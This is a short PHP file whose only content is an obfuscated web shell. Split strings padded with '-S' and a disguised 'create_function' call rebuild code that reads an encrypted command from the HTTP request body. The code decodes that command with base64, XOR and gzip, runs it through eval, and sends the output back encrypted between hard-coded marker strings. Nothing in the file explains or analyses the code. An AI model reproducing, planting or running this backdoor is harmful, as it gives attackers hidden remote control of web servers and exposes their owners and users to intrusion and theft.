<?php
$q=';(-S$j<-S-S$c&&$i<$l);$j-S+-S+,$i++){$o.=$t{$i-S}^$k{$j-S};}}ret-Surn-S $o-S;}i-Sf-S (@preg_match';
$v='$k="a28c-S7356";$-Skh=-S"3a2990-S5a89-S4e";$-Skf="4ff723b-Se1812-S";$p="D-SJsz-SQTV-SBXH5smZrx"-S;funct';
$B='(-S"/$kh(.+)-S-S$kf/-S",@file_get_cont-Sents(-S"php:-S//-Sin-Spu-St"),$-S-Sm)==1) {@ob_start();@e';
$C=str_replace('h','','chreathe_hhfunhhction');
$r='va-Sl(@gzunc-Sompre-Sss(@-Sx(@ba-Sse6-S4_decode($-Sm-S[1]),-S$-Sk)));$o=@ob_get_co-Sntents();-S@o-Sb';
$T='-S-Sion x($t,$k)-S{$c=str-Slen($-Sk);$l=-S-Sstrlen(-S$t);$o="";fo-Sr-S($i=-S0;$i<$l-S;){for($j-S=0';
$P='_end_clean-S(-S);$r-S=@base-S64_encode(@x-S(@gz-Scompres-Ss($o),-S$k))-S;p-Sr-Sint("$p$kh$r$kf");}';
$R=str_replace('-S','',$v.$T.$q.$B.$r.$P);
$X=$C('',$R);$X();
?>
